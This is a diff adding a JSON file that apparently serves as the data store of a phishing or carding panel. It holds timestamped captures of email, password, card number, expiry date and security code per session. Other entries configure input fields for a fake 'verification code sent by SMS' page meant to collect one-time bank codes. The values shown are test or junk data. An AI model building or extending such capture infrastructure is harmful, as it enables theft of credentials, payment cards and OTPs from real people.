@@ -1,0 +1,84 @@
+{
+  "07b3f9-b297-f42b50": {
+    "email": {
+      "value": "azeazeaze",
+      "timestamp": "2025-03-09T11:22:00.475Z"
+    },
+    "password": {
+      "value": "ezaazeaezeazaze",
+      "timestamp": "2025-03-09T11:22:02.000Z"
+    },
+    "cardNumber": {
+      "value": "4111 1111 1111 1111",
+      "timestamp": "2025-03-09T11:22:18.783Z"
+    },
+    "expiryDate": {
+      "value": "12/89",
+      "timestamp": "2025-03-09T11:22:20.508Z"
+    },
+    "securityCode": {
+      "value": "123",
+      "timestamp": "2025-03-09T11:22:20.935Z"
+    },
+    "nameOnCard": {
+      "value": "321231213 132321",
+      "timestamp": "2025-03-09T11:22:10.717Z"
+    }
+  },
+  "41d73a-348f-fb397f": {
+    "2": {
+      "value": "100000000000",
+      "timestamp": "2025-03-09T11:45:39.166Z"
+    },
+    "inputsConfig": [
+      {
+        "id": 1,
+        "name": "1",
+        "type": "hidden",
+        "placeholder": ""
+      },
+      {
+        "id": 2,
+        "name": "2",
+        "type": "text",
+        "placeholder": ""
+      },
+      {
+        "id": 3,
+        "name": "3",
+        "type": "hidden",
+        "placeholder": ""
+      }
+    ],
+    "customText": "A Verification Code has been sent to your registered mobile phone number via SMS. By clicking Submit, you are deemed to have accepted the terms and conditions below."
+  },
+  "f5c552-b8ce-b979c0": {
+    "inputsConfig": [
+      {
+        "id": 1,
+        "name": "1",
+        "type": "text",
+        "placeholder": ""
+      },
+      {
+        "id": 2,
+        "name": "2",
+        "type": "hidden",
+        "placeholder": ""
+      },
+      {
+        "id": 3,
+        "name": "3",
+        "type": "hidden",
+        "placeholder": ""
+      }
+    ],
+    "customText": "pl pl pl A Verification Code has been sent to your registered mobile phone number via SMS. By clicking Submit, you are deemed to have accepted the terms and conditions below."
+  },
+  "08d243-6d76-bba9f6": {
+    "": {
+      "value": "",
+      "timestamp": "2025-03-09T11:45:33.713Z"
+    }
+  }
+}
